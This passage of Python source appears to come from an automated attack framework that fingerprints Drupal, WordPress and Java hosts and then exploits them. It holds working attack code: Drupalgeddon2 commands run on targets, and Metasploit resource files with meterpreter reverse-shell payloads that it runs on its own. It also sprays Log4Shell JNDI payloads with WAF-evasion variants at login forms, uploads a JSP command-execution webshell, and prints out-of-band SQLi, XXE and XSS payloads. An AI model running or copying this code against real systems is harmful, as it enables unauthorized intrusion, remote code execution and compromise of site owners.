    log("info", "Running semgrep security-audit ruleset...")
    ok, out = run_cmd(
        f'semgrep --config=p/security-audit "{source_dir}" '
        f'--json -o "{json_out}" --quiet 2>&1',
        timeout=SEMGREP_TIMEOUT,
        watch_file=out_dir,
        watch_phase="SEMGREP"
    )
    # Summary
    if os.path.exists(json_out):
        try:
            data = json.load(open(json_out))
            results = data.get("results", [])
            by_sev = {}
            for r in results:
                sev = r.get("extra", {}).get("severity", "INFO")
                by_sev[sev] = by_sev.get(sev, 0) + 1
            summary = "\n".join(f"  {k}: {v}" for k, v in sorted(by_sev.items()))
            with open(txt_out, "w") as f:
                f.write(f"Semgrep results for {source_dir}\n{summary}\n\nRaw: {json_out}\n")
            print(f"\n{BOLD}Semgrep findings:{NC}")
            for sev, count in sorted(by_sev.items()):
                colour = RED if sev == "ERROR" else YELLOW if sev == "WARNING" else CYAN
                print(f"  {colour}{sev}: {count}{NC}")
            log("ok", f"Semgrep complete → {json_out}")
        except Exception as e:
            log("warn", f"Semgrep JSON parse error: {e}")
    else:
        log("warn", "Semgrep produced no output")

    _brain_phase_complete(
        "SEMGREP",
        ok,
        detail=f"target={domain} source={source_dir}",
        artifacts={"semgrep": out_dir},
    )
    return True


# ── NEW: OOB Setup ─────────────────────────────────────────────────────────────
def run_oob_setup() -> None:
    """Show interactsh session token for use in OOB tests."""
    log("phase", "OOB SETUP (interactsh)")
    isc = _tool_bin("interactsh-client")
    if not _which(isc):
        log("err", "interactsh-client not found")
        log("info", "Install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")
        return

    print(f"""
{BOLD}{'─'*55}
  Out-of-Band (OOB) Testing Setup
{'─'*55}{NC}

{CYAN}interactsh-client{NC} is installed at: {isc}

{BOLD}Start a listener (in a separate terminal):{NC}
  {CYAN}{isc} -v{NC}

  → This gives you a unique URL like:
    {YELLOW}https://abc123def.interact.sh{NC}

{BOLD}Use your interactsh URL in:{NC}
  SQLi OOB:   ' AND LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.',YOUR_TOKEN.interact.sh,'\\\\a'))--
  SSRF:        https://YOUR_TOKEN.interact.sh/ssrf-test
  XXE:         <!DOCTYPE x [<!ENTITY oob SYSTEM "http://YOUR_TOKEN.interact.sh/xxe">]>
  Blind XSS:  <script src=//YOUR_TOKEN.interact.sh/xss></script>
  Log4Shell:  ${{jndi:ldap://YOUR_TOKEN.interact.sh/a}}

{BOLD}Alternatives (no install required):{NC}
  {YELLOW}webhook.site{NC}    → https://webhook.site  (HTTP callbacks)
  {YELLOW}canarytokens.org{NC} → https://canarytokens.org  (URL, DNS, PDF, Word tokens)
  {YELLOW}interactsh app{NC}  → https://app.interactsh.com  (web UI)

{BOLD}{'─'*55}{NC}
""")


# ── Metasploit helpers ──────────────────────────────────────────────────────────
def _get_lhost() -> str:
    """Auto-detect local IP for Metasploit LHOST (macOS + Linux)."""
    import platform, socket
    if platform.system() == "Darwin":
        for iface in ("en0", "en1", "en2", "utun0", "eth0"):
            ok, out = run_cmd(f"ipconfig getifaddr {iface} 2>/dev/null", timeout=5)
            if ok and out.strip() and "." in out.strip():
                return out.strip()
    # Linux / fallback
    ok, out = run_cmd("hostname -I 2>/dev/null | awk '{print $1}'", timeout=5)
    if ok and out.strip() and "." in out.strip():
        return out.strip()
    # Socket trick — picks interface used to reach internet
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def run_msf(rc_path: str, label: str = "", timeout: int = 360) -> bool:
    """
    Execute a Metasploit resource file non-interactively.
      • Auto-detects and patches LHOST into the .rc file
      • Spools msfconsole output to <rc_path>_output.txt
      • Detects: session opened / meterpreter / shell
      • Returns True if a session was obtained
    """
    msf_bin = shutil.which("msfconsole")
    if not msf_bin:
        log("warn", "msfconsole not installed — skipping auto-exploit")
        return False

    lhost   = _get_lhost()
    auto_rc = rc_path.replace(".rc", "_auto.rc")
    log_path = rc_path.replace(".rc", "_output.txt")

    try:
        with open(rc_path) as fh:
            rc_content = fh.read()
        rc_content = rc_content.replace("YOUR_IP", lhost)
        # Prepend spool + append clean exit so msfconsole doesn't hang
        rc_content = f"spool {log_path}\n" + rc_content + "\nexit -y\n"
        with open(auto_rc, "w") as fh:
            fh.write(rc_content)
    except Exception as e:
        log("err", f"Failed to patch .rc file: {e}")
        return False

    lbl = f" [{label}]" if label else ""
    log("info", f"msfconsole{lbl}: LHOST={lhost} — running {os.path.basename(auto_rc)}")
    log("info", "  Loading Metasploit framework (60-120s)...")
    phase_name = f"MSF {label}".strip()
    if _brain and _brain.enabled:
        _brain.phase_start(phase_name, os.path.basename(auto_rc))
    run_live(
        f'"{msf_bin}" -q -r "{auto_rc}"',
        timeout=timeout,
        watch_file=log_path,
        watch_phase=phase_name,
        watch_interval=30,
        watch_max_stale=WATCHDOG_MSF_IDLE,
    )

    # Parse spool log for session
    session_opened = False
    if os.path.exists(log_path):
        try:
            msf_out = open(log_path).read().lower()
        except Exception:
            msf_out = ""
        if any(kw in msf_out for kw in (
            "meterpreter session", "command shell session",
            "session opened", "session 1 opened", "shell session"
        )):
            session_opened = True
            log("crit", f"METERPRETER SESSION OPENED{lbl} — see {log_path}")
        elif "exploit completed" in msf_out:
            log("ok",   f"Exploit completed (no session) — see {log_path}")
        elif any(kw in msf_out for kw in ("exploit failed", "no session was created", "failure")):
            log("info", f"Exploit failed/no session — see {log_path}")
        else:
            log("info", f"MSF run complete — review {log_path}")
    _brain_phase_complete(
        phase_name,
        session_opened,
        detail=f"resource={os.path.basename(auto_rc)} session_opened={session_opened}",
        artifacts={"msf_log": log_path},
    )
    return session_opened


# ── NEW: CMS Exploit (Drupal/WordPress) ────────────────────────────────────────
def run_cms_exploit(domain: str) -> bool:
    """
    CMS detection + exploitation PoC:
    1. whatweb fingerprinting on live hosts
    2. nuclei CMS-specific CVE templates
    3. nuclei Drupal templates on detected Drupal hosts (replaces droopescan — Python 3.14 compat)
    4. drupalgeddon2.py PoC (CVE-2018-7600) — RCE verification
    5. WordPress user enum + REST API leak
    6. Auto-generate Metasploit .rc files
    """
    log("phase", f"CMS EXPLOIT: {domain}")
    recon_dir   = _resolve_recon_dir(domain)
    findings_dir = _resolve_findings_dir(domain, create=True)
    exploit_dir = os.path.join(findings_dir, "exploits")
    msf_dir     = os.path.join(findings_dir, "metasploit")
    os.makedirs(exploit_dir, exist_ok=True)
    os.makedirs(msf_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("CMS EXPLOIT", f"target={domain}")

    live_file    = os.path.join(recon_dir, "live", "httpx_full.txt")
    live_urls    = os.path.join(recon_dir, "live", "urls.txt")
    attack_surface_file = os.path.join(recon_dir, "priority", "attack_surface.json")
    whatweb_bin  = _tool_bin("whatweb")
    drupal_poc   = _tool_bin("drupalgeddon2")
    nuclei_bin   = _tool_bin("nuclei")

    if not os.path.isfile(live_file):
        log("warn", "No httpx_full.txt — run recon first")
        _brain_phase_complete("CMS EXPLOIT", False, detail=f"target={domain} missing httpx_full.txt")
        return False

    # ── Step 1: whatweb fingerprinting ──
    whatweb_out = os.path.join(exploit_dir, "whatweb.txt")
    if _which(whatweb_bin):
        log("info", "whatweb: fingerprinting live hosts...")
        run_cmd(
            f'cat "{live_urls}" 2>/dev/null | head -50 | '
            f'xargs -I{{}} {whatweb_bin} --color=never {{}} 2>/dev/null | tee "{whatweb_out}"',
            timeout=300,
            watch_file=exploit_dir,
            watch_phase="CMS EXPLOIT"
        )
    else:
        log("warn", "whatweb not installed — skipping fingerprint step")

    # ── Step 2: nuclei CMS CVE templates ──
    nuclei_cms_out = os.path.join(exploit_dir, "nuclei_cms.txt")
    if _which(nuclei_bin):
        log("info", "nuclei: running CMS CVE templates...")
        nuclei_targets = live_urls if os.path.isfile(live_urls) else live_file
        run_cmd(
            f'{nuclei_bin} -l "{nuclei_targets}" -tags drupal,wordpress,joomla,cms '
            f'-severity critical,high,medium -silent -o "{nuclei_cms_out}" 2>/dev/null',
            timeout=600,
            watch_file=exploit_dir,
            watch_phase="CMS EXPLOIT"
        )
        if os.path.exists(nuclei_cms_out):
            count = sum(1 for _ in open(nuclei_cms_out) if _.strip())
            log("ok" if count == 0 else "crit", f"nuclei CMS: {count} findings → {nuclei_cms_out}")
    else:
        log("warn", "nuclei not installed")

    # ── Step 3: Detect Drupal hosts ──
    def remember_host(store: dict[str, str], candidate: str) -> None:
        candidate = (candidate or "").strip()
        if not candidate.startswith(("http://", "https://")):
            return
        parsed = urlsplit(candidate)
        if not parsed.scheme or not parsed.netloc:
            return
        base = f"{parsed.scheme}://{parsed.netloc.lower()}"
        key = parsed.netloc.lower()
        existing = store.get(key)
        if existing is None or (existing.startswith("http://") and base.startswith("https://")):
            store[key] = base

    drupal_hosts_map: dict[str, str] = {}
    drupal_host_meta: dict[str, dict] = {}
    attack_surface = _load_json(attack_surface_file, {})
    for host in attack_surface.get("top_hosts", []):
        if "drupal" in {tech.lower() for tech in host.get("tech_matches", [])}:
            remember_host(drupal_hosts_map, host.get("url", ""))
            url = (host.get("url") or "").strip()
            if url.startswith(("http://", "https://")):
                parsed = urlsplit(url)
                base = f"{parsed.scheme}://{parsed.netloc.lower()}"
                drupal_host_meta[base] = host

    for source_file in (
        os.path.join(recon_dir, "urls", "js_files.txt"),
        os.path.join(recon_dir, "urls", "with_params.txt"),
    ):
        if not os.path.isfile(source_file):
            continue
        with open(source_file, errors="ignore") as fh:
            for line in fh:
                lower = line.lower()
                if any(marker in lower for marker in (
                    "/misc/drupal.js", "/misc/ajax.js?v=", "/misc/progress.js?v=", "/user/login",
                )):
                    remember_host(drupal_hosts_map, line.strip())

    for f in (whatweb_out, live_file):
        if os.path.exists(f):
            for line in open(f):
                if "drupal" in line.lower():
                    parts = line.split()
                    if parts:
                        remember_host(drupal_hosts_map, parts[0].strip())
            if drupal_hosts_map:
                break

    drupal_hosts = list(drupal_hosts_map.values())
    if not drupal_hosts:
        # Fallback: grep httpx_full.txt for Drupal tech detection
        ok, out = run_cmd(
            f'grep -i "drupal" "{live_file}" | awk \'{{print $1}}\' | sort -u',
            timeout=10
        )
        if out.strip():
            for host in out.strip().splitlines():
                remember_host(drupal_hosts_map, host.strip())

    if not drupal_hosts_map and os.path.isfile(live_urls):
        for host in open(live_urls, errors="ignore"):
            host = host.strip()
            if not host.startswith(("http://", "https://")):
                continue
            for path in ("/misc/drupal.js", "/user/login", "/CHANGELOG.txt"):
                ok, status = run_cmd(
                    f'curl -sk -o /dev/null -w "%{{http_code}}" --max-time 8 "{host}{path}"',
                    timeout=12
                )
                if ok and status in {"200", "301", "302", "403"}:
                    remember_host(drupal_hosts_map, host)
                    break

    drupal_hosts = list(drupal_hosts_map.values())

    if drupal_hosts:
        log("crit", f"Drupal detected on {len(drupal_hosts)} host(s): {drupal_hosts}")

        # ── Step 3a: nuclei Drupal templates (replaces droopescan; works on Python 3.14) ──
        nuclei_bin = _tool_bin("nuclei")
        if _which(nuclei_bin):
            for host in drupal_hosts[:5]:
                safe = host.replace("://", "_").replace("/", "_").replace(":", "_")
                droop_out = os.path.join(exploit_dir, f"drupal_nuclei_{safe}.txt")
                log("info", f"nuclei (drupal templates): {host}")
                ok, out = run_cmd(
                    f'{nuclei_bin} -u "{host}" -tags drupal,cms '
                    f'-severity medium,high,critical -silent -o "{droop_out}"',
                    timeout=300,
                    watch_file=exploit_dir,
                    watch_phase="CMS EXPLOIT"
                )
                print(out[:2000])
        else:
            log("warn", "nuclei not installed — skipping Drupal template scan")

        # ── Step 3b: drupalgeddon2 PoC (CVE-2018-7600) ──
        if os.path.isfile(drupal_poc) and os.access(drupal_poc, os.R_OK):
            for host in drupal_hosts[:5]:
                host_meta = drupal_host_meta.get(host, {})
                version_hints = [v for v in host_meta.get("version_hints", []) if v.lower().startswith("drupal ")]
                vulnerable_versions = [
                    v.split(" ", 1)[1]
                    for v in version_hints
                    if _is_vulnerable_drupal_version(v.split(" ", 1)[1])
                ]
                safe = host.replace("://", "_").replace("/", "_").replace(":", "_")
                poc_out = os.path.join(exploit_dir, f"drupalgeddon2_{safe}.txt")
                if not vulnerable_versions:
                    log("info", f"Skipping standalone Drupalgeddon2 PoC on {host} — no vulnerable Drupal version evidence yet")
                    continue
                log("crit", f"Testing CVE-2018-7600 on {host} (version hint: {', '.join(vulnerable_versions)})...")
                cmds = ["id", "uname -a", "hostname", "cat /etc/issue"]
                results_text = f"# Drupalgeddon2 PoC — {host}\n"
                for cmd in cmds:
                    ok, out = run_cmd(
                        f'python3 "{drupal_poc}" "{host}" -c "{cmd}" 2>&1',
                        timeout=30
                    )
                    results_text += f"\n## {cmd}\n{out}\n"
                    if ok and out.strip():
                        log("crit", f"RCE CONFIRMED on {host}: {cmd} → {out[:80]}")
                with open(poc_out, "w") as f:
                    f.write(results_text)
                log("ok", f"Drupalgeddon2 results → {poc_out}")

                # curl fallback for one-liner verification
                curl_poc = os.path.join(exploit_dir, f"drupal_curl_poc_{safe}.txt")
                run_cmd(
                    f'curl -sk "{host}/?q=user/password&name[%23post_render][]=passthru'
                    f'&name[%23type]=markup&name[%23markup]=id" '
                    f'-d "form_build_id=form-pFx6QSRoFjBBlOeHgzSrNe8BEVGfJyJjCk7jFiMQ" 2>&1 | tee "{curl_poc}"',
                    timeout=15
                )

                # ── Generate + auto-run Metasploit .rc files ──────────────────
                proto      = "true" if host.startswith("https") else "false"
                port       = "443" if host.startswith("https") else "80"
                host_clean = host.replace("https://", "").replace("http://", "").rstrip("/")

                # CVE-2018-7600 — Drupalgeddon 2 (unauthenticated RCE, Drupal 6/7/8)
                rc2 = os.path.join(msf_dir, f"drupalgeddon2_{safe}.rc")
                with open(rc2, "w") as f:
                    f.write(f"""use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS {host_clean}
set RPORT {port}
set SSL {proto}
set TARGETURI /
set LHOST YOUR_IP
set LPORT 4444
set PAYLOAD php/meterpreter/reverse_tcp
check
""")
                log("ok", f"MSF .rc (CVE-2018-7600) → {rc2}")
                run_msf(rc2, label="CVE-2018-7600 Drupalgeddon2")

                log("info", "Skipping Metasploit Drupalgeddon3 resource generation — no stock module is installed for CVE-2018-7602")

                # CVE-2014-3704 — Drupalgeddon 1 (SQLi → session hijack, Drupal 7 < 7.32)
                rc1 = os.path.join(msf_dir, f"drupalgeddon1_sqli_{safe}.rc")
                with open(rc1, "w") as f:
                    f.write(f"""use exploit/multi/http/drupal_drupageddon
set RHOSTS {host_clean}
set RPORT {port}
set SSL {proto}
set TARGETURI /
set LHOST YOUR_IP
set LPORT 4446
set PAYLOAD php/meterpreter/reverse_tcp
check
""")
                log("ok", f"MSF .rc (CVE-2014-3704) → {rc1}")
                run_msf(rc1, label="CVE-2014-3704 Drupalgeddon1 SQLi")
        else:
            log("warn", f"drupalgeddon2.py not found at {drupal_poc}")
            log("info", f'Install: mkdir -p "{REPO_TOOLS_DIR}" && curl -sL https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-2018-7600.py -o "{REPO_TOOLS_DIR}/drupalgeddon2.py"')

    # ── Step 4: WordPress detection ──
    wp_hosts_map: dict[str, str] = {}
    for host in attack_surface.get("top_hosts", []):
        techs = {tech.lower() for tech in host.get("tech_matches", [])}
        if "wordpress" in techs:
            remember_host(wp_hosts_map, host.get("url", ""))

    for f in (whatweb_out, live_file):
        if os.path.exists(f):
            for line in open(f):
                if "wordpress" in line.lower() or "wp-content" in line.lower():
                    parts = line.split()
                    if parts:
                        remember_host(wp_hosts_map, parts[0].strip())
            if wp_hosts_map:
                break
    wp_hosts = list(wp_hosts_map.values())
    if not wp_hosts:
        ok, out = run_cmd(
            f'grep -iE "wordpress|wp-content|wp-json" "{live_file}" | awk \'{{print $1}}\' | sort -u',
            timeout=10
        )
        if out.strip():
            for host in out.strip().splitlines():
                remember_host(wp_hosts_map, host.strip())
    wp_hosts = list(wp_hosts_map.values())

    # Live-verify WordPress hosts before running recon — historical GAU URLs
    # can trigger WP detection for sites that have since migrated away from WordPress.
    # A 200 on wp-login.php or a JSON response from wp-json confirms it's still active.
    confirmed_wp_hosts = []
    for host in wp_hosts[:5]:
        for probe in (f"{host}/wp-login.php", f"{host}/wp-json/wp/v2/"):
            ok_p, probe_out = run_cmd(
                f'curl -sk -o /dev/null -w "%{{http_code}}" --max-time 8 --max-redirs 1 "{probe}"',
                timeout=12
            )
            status = probe_out.strip()
            if status in ("200", "401", "403"):
                confirmed_wp_hosts.append(host)
                log("crit", f"WordPress confirmed live at {host} (probe={probe} status={status})")
                break
        else:
            log("warn", f"WordPress fingerprint found for {host} but live probes returned no WP response — skipping WP recon (likely migrated)")
    wp_hosts = confirmed_wp_hosts

    if wp_hosts:
        log("crit", f"WordPress confirmed on {len(wp_hosts)} host(s)")
        for host in wp_hosts[:5]:
            safe = host.replace("://", "_").replace("/", "_").replace(":", "_")
            wp_out = os.path.join(exploit_dir, f"wordpress_{safe}.txt")
            results = [f"# WordPress recon — {host}\n"]

            # User enum via /?author=N
            for n in range(1, 4):
                ok, out = run_cmd(
                    f'curl -sk -D- -L "{host}/?author={n}" 2>/dev/null | grep -iE "location:|author/" | head -3',
                    timeout=10
                )
                if out.strip():
                    results.append(f"## author={n}\n{out}\n")

            # REST API user leak
            ok, out = run_cmd(
                f'curl -sk "{host}/wp-json/wp/v2/users" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -40',
                timeout=10
            )
            if out.strip() and "name" in out:
                results.append(f"## /wp-json/wp/v2/users\n{out}\n")
                log("crit", f"WordPress user leak at {host}/wp-json/wp/v2/users")

            # xmlrpc check
            ok, out = run_cmd(
                f'curl -sk -X POST "{host}/xmlrpc.php" -d "<?xml version=\'1.0\'?><methodCall><methodName>system.listMethods</methodName></methodCall>" 2>/dev/null | head -5',
                timeout=10
            )
            if out.strip() and "methodResponse" in out:
                results.append(f"## xmlrpc.php\n{out[:300]}\n")
                log("crit", f"xmlrpc.php active at {host}")

            with open(wp_out, "w") as f:
                f.write("\n".join(results))
            log("ok", f"WordPress recon → {wp_out}")

            # Metasploit .rc for WordPress
            proto = "true" if host.startswith("https") else "false"
            port  = "443" if host.startswith("https") else "80"
            host_clean = host.replace("https://", "").replace("http://", "").rstrip("/")
            rc_path = os.path.join(msf_dir, f"wordpress_{safe}.rc")
            with open(rc_path, "w") as f:
                f.write(f"""use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS {host_clean}
set RPORT {port}
set SSL {proto}
set TARGETURI /
set USERNAME admin
set PASSWORD admin
set LHOST YOUR_IP
set LPORT 4445
set PAYLOAD php/meterpreter/reverse_tcp
show options
exploit
""")
            log("ok", f"WordPress Metasploit .rc → {rc_path}")
            run_msf(rc_path, label="WP admin shell upload")

    if not drupal_hosts and not wp_hosts:
        log("info", "No Drupal or WordPress hosts detected")

    _brain_phase_complete(
        "CMS EXPLOIT",
        True,
        detail=f"target={domain} drupal_hosts={len(drupal_hosts)} wp_hosts={len(wp_hosts)}",
        artifacts={"exploits": exploit_dir, "metasploit": msf_dir},
    )
    return True


# ── RCE Scan: Log4Shell + Tomcat CVE-2017-12615 + JBoss ─────────────────────────
def run_rce_scan(domain: str) -> bool:
    """
    Targeted RCE detection for Java/Tomcat/JBoss targets found during recon:

    1. Extract Java/Tomcat/JBoss/Spring targets from httpx_full.txt
    2. Log4Shell (CVE-2021-44228): inject JNDI payloads in User-Agent,
       X-Forwarded-For, Referer, X-Api-Version, POST body via interactsh OOB
    3. CVE-2017-12615 (Tomcat PUT JSP upload): attempt PUT /test.jsp,
       then GET to confirm code execution
    4. JBoss admin console exposure: probe /jmx-console/, /invoker/JMXInvokerServlet,
       /web-console/, /admin-console/ for unauthenticated access
    5. nuclei CVE templates for Tomcat + JBoss (cve-2017-12615, cve-2017-5638, etc.)
    6. Write all evidence to findings/{domain}/rce/
    """
    log("phase", f"RCE SCAN: {domain}")
    recon_dir   = _resolve_recon_dir(domain)
    rce_dir     = os.path.join(_resolve_findings_dir(domain, create=True), "rce")
    os.makedirs(rce_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("RCE SCAN", f"target={domain}")

    live_file = os.path.join(recon_dir, "live", "httpx_full.txt")
    if not os.path.isfile(live_file):
        log("warn", "No httpx_full.txt — run recon first")
        _brain_phase_complete("RCE SCAN", False, detail=f"target={domain} missing httpx_full.txt")
        return False

    # ── Step 1: Extract Java / Tomcat / JBoss / Spring targets ──────────────────
    java_targets: list[str] = []
    tomcat_targets: list[str] = []
    jboss_targets: list[str] = []

    java_tech_re = r"(?i)tomcat|jboss|jee|java|spring|struts|wildfly|glassfish|weblogic|websphere|jsp"
    ok, out = run_cmd(
        f'grep -iE "{java_tech_re}" "{live_file}" | awk \'{{print $1}}\' | sort -u',
        timeout=10
    )
    for line in out.strip().splitlines():
        url = line.strip()
        if not url.startswith("http"):
            continue
        java_targets.append(url)
        if "tomcat" in url.lower():
            tomcat_targets.append(url)
        elif "jboss" in url.lower() or "wildfly" in url.lower():
            jboss_targets.append(url)

    # Also grep full lines to separate by technology from the tech column
    for line in open(live_file, errors="ignore"):
        url = line.split()[0].strip() if line.split() else ""
        if not url.startswith("http"):
            continue
        lline = line.lower()
        if ("tomcat" in lline) and url not in tomcat_targets:
            tomcat_targets.append(url)
            if url not in java_targets:
                java_targets.append(url)
        if ("jboss" in lline or "wildfly" in lline) and url not in jboss_targets:
            jboss_targets.append(url)
            if url not in java_targets:
                java_targets.append(url)

    # Deduplicate
    java_targets   = list(dict.fromkeys(java_targets))
    tomcat_targets = list(dict.fromkeys(tomcat_targets))
    jboss_targets  = list(dict.fromkeys(jboss_targets))

    log("info", f"Java targets: {len(java_targets)} | Tomcat: {len(tomcat_targets)} | JBoss: {len(jboss_targets)}")

    if not java_targets:
        log("info", "No Java/Tomcat/JBoss targets detected — skipping RCE scan")
        return True

    # ── Step 2: nuclei CVE templates (Tomcat + JBoss + Log4Shell) ───────────────
    nuclei_bin = _tool_bin("nuclei")
    nuclei_rce_out = os.path.join(rce_dir, "nuclei_rce.txt")
    if _which(nuclei_bin):
        targets_file = os.path.join(rce_dir, "java_targets.txt")
        with open(targets_file, "w") as f:
            f.write("\n".join(java_targets[:30]) + "\n")

        log("info", f"nuclei: CVE templates (tomcat, jboss, log4shell, rce) on {len(java_targets[:30])} hosts")
        ok, out = run_cmd(
            f'{nuclei_bin} -l "{targets_file}" '
            f'-tags tomcat,jboss,log4shell,rce,cve '
            f'-severity critical,high,medium '
            f'-silent -o "{nuclei_rce_out}" 2>/dev/null',
            timeout=600,
            watch_file=rce_dir,
            watch_phase="RCE SCAN"
        )
        if os.path.exists(nuclei_rce_out):
            count = sum(1 for l in open(nuclei_rce_out) if l.strip())
            if count:
                log("crit", f"nuclei RCE: {count} findings → {nuclei_rce_out}")
                for l in open(nuclei_rce_out):
                    log("crit", f"  {l.strip()}")
            else:
                log("info", f"nuclei RCE: 0 findings")
        # Also run specifically on Tomcat/JBoss CVEs
        nuclei_tomcat_out = os.path.join(rce_dir, "nuclei_tomcat_cve.txt")
        run_cmd(
            f'{nuclei_bin} -l "{targets_file}" '
            f'-id "CVE-2017-12615,CVE-2019-0232,CVE-2020-1938,CVE-2021-44228,CVE-2021-45046" '
            f'-silent -o "{nuclei_tomcat_out}" 2>/dev/null',
            timeout=300,
            watch_file=rce_dir,
            watch_phase="RCE SCAN"
        )
        if os.path.exists(nuclei_tomcat_out) and os.path.getsize(nuclei_tomcat_out) > 0:
            for l in open(nuclei_tomcat_out):
                log("crit", f"[CVE] {l.strip()}")
    else:
        log("warn", "nuclei not installed — skipping CVE template scan")

    # ── Step 3: Log4Shell (CVE-2021-44228) via interactsh OOB ───────────────────
    # Try to get interactsh URL from env or generate a placeholder
    oob_url = os.environ.get("INTERACTSH_URL", "").strip()
    interactsh_bin = _tool_bin("interactsh-client")

    log4shell_results: list[str] = []
    put_allowed_targets: list[str] = []
    put_upload_targets: list[str] = []
    rce_confirmed_targets: list[str] = []
    jboss_exposed_targets: list[str] = []
    jboss_default_cred_targets: list[str] = []

    # Start interactsh in background if binary available and no URL set
    interactsh_proc = None
    interactsh_log  = os.path.join(rce_dir, "interactsh_log.jsonl")
    if not oob_url and _which(interactsh_bin):
        log("info", "Starting interactsh-client for Log4Shell OOB callbacks...")
        try:
            # Merge stderr→stdout so we capture the OOB URL regardless of which
            # stream interactsh-client uses (it often prints it on stderr).
            interactsh_proc = subprocess.Popen(
                [interactsh_bin, "-json", "-o", interactsh_log],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                text=True
            )
            # Non-blocking readline with a hard deadline so this phase
            # never deadlocks waiting on an empty pipe.
            import select as _select
            if interactsh_proc.stdout:
                deadline = time.time() + 10
                while time.time() < deadline:
                    ready, _, _ = _select.select([interactsh_proc.stdout], [], [], 0.5)
                    if not ready:
                        continue
                    line = interactsh_proc.stdout.readline()
                    if not line:
                        break
                    if ".oast." in line or "interact.sh" in line:
                        # Parse URL from interactsh stdout (it prints the domain)
                        import re as _re
                        m = _re.search(r'([a-z0-9]+\.oast\.[a-z]+|[a-z0-9]+\.interact\.sh)', line)
                        if m:
                            oob_url = f"ldap://{m.group(1)}"
                            log("ok", f"interactsh OOB: {oob_url}")
                            break
            if not oob_url:
                log("warn", "interactsh started but no OOB URL appeared within 10s")
        except Exception as e:
            log("warn", f"interactsh-client failed to start: {e}")
            interactsh_proc = None

    if not oob_url:
        # Fallback: use a static placeholder — will still test for connection attempts
        # that appear in server logs even without OOB
        log("warn", "No interactsh OOB URL — Log4Shell will use canary hostname (no live callback)")
        oob_url = f"ldap://log4shell-test.{domain}.scan.invalid"

    log4shell_payload = "${jndi:" + oob_url.replace("ldap://", "ldap://") + "/log4shell}"
    # Obfuscated variants to bypass simple WAF rules
    log4shell_variants = [
        "${jndi:" + oob_url.replace("ldap://", "ldap://") + "/a}",
        "${${lower:j}ndi:ldap://" + oob_url.split("//")[-1] + "/b}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://" + oob_url.split("//")[-1] + "/c}",
        "${jndi:${lower:l}${lower:d}a${lower:p}://" + oob_url.split("//")[-1] + "/d}",
    ]

    log4shell_out = os.path.join(rce_dir, "log4shell.txt")
    log4s_results = [f"# Log4Shell (CVE-2021-44228) — {domain}\n# OOB: {oob_url}\n"]

    for target_url in java_targets[:20]:
        for payload in log4shell_variants[:2]:  # 2 variants per host to limit noise
            # Inject in User-Agent, X-Forwarded-For, Referer
            headers = [
                ("User-Agent", payload),
                ("X-Forwarded-For", payload),
                ("X-Api-Version", payload),
            ]
            for header_name, header_value in headers:
                _, out = run_cmd_args(
                    [
                        "curl", "-sk", "-m", "5",
                        "-H", f"{header_name}: {header_value}",
                        target_url,
                        "-o", "/dev/null",
                        "-w", "%{http_code}",
                    ],
                    timeout=10,
                )
                status = out.strip().splitlines()[-1] if out.strip() else ""
                if status and status not in ("000", ""):
                    log4s_results.append(f"[{status}] {target_url} | header={header_name}")

        # Also inject in POST body params common to login forms
        for path in ("/login", "/api/login", "/j_security_check", "/auth"):
            _, out = run_cmd_args(
                [
                    "curl", "-sk", "-m", "5", "-X", "POST",
                    f"{target_url}{path}",
                    "-d", f"username={log4shell_variants[0]}&password=test",
                    "-H", "Content-Type: application/x-www-form-urlencoded",
                    "-o", "/dev/null",
                    "-w", "%{http_code}",
                ],
                timeout=10,
            )
            status = out.strip().splitlines()[-1] if out.strip() else ""
            if status and status not in ("000", ""):
                log4s_results.append(f"[{status}] {target_url}{path} | POST body log4shell")

    with open(log4shell_out, "w") as f:
        f.write("\n".join(log4s_results))
    log("ok", f"Log4Shell probes sent → {log4shell_out}")

    # Wait for OOB callbacks (8 seconds)
    if interactsh_proc:
        log("info", "Waiting 8s for Log4Shell OOB callbacks...")
        time.sleep(8)
        # Check the jsonl log for any callbacks
        if os.path.exists(interactsh_log):
            with open(interactsh_log) as f:
                callbacks = [l for l in f if l.strip()]
            if callbacks:
                log("crit", f"Log4Shell OOB CALLBACKS RECEIVED: {len(callbacks)}")
                for cb in callbacks:
                    log("crit", f"  {cb.strip()}")
                with open(log4shell_out, "a") as f:
                    f.write("\n\n# OOB CALLBACKS\n" + "\n".join(callbacks))
            else:
                log("info", "No OOB callbacks (may need longer wait or firewall blocks DNS)")
        interactsh_proc.terminate()

    # ── Step 4: CVE-2017-12615 (Tomcat PUT JSP upload RCE) ──────────────────────
    tomcat_rce_out = os.path.join(rce_dir, "tomcat_put_rce.txt")
    tomcat_results = [f"# CVE-2017-12615 Tomcat PUT RCE — {domain}\n"]

    # Detect Tomcat targets: any Java target running Tomcat based on Server header or tech tag
    put_targets = tomcat_targets if tomcat_targets else java_targets[:10]

    jsp_content = """<%@ page import="java.io.*" %>
<%
out.println("CVE-2017-12615-CONFIRMED");
try {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"});
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
}
catch (Exception e) {
    out.println("EXEC_ERROR:" + e.getClass().getName() + ":" + e.getMessage());
}
%>
"""
    test_jsp = f"test{int(time.time()) % 10000}.jsp"
    jsp_payload_path = os.path.join(rce_dir, f"{test_jsp}.payload")
    with open(jsp_payload_path, "w") as jsp_file:
        jsp_file.write(jsp_content)

    for target_url in put_targets[:10]:
        # Test 1: OPTIONS to see allowed methods
        _, out = run_cmd_args(
            ["curl", "-sk", "-m", "5", "-X", "OPTIONS", "-D-", "-o", "/dev/null", f"{target_url}/"],
            timeout=10,
        )
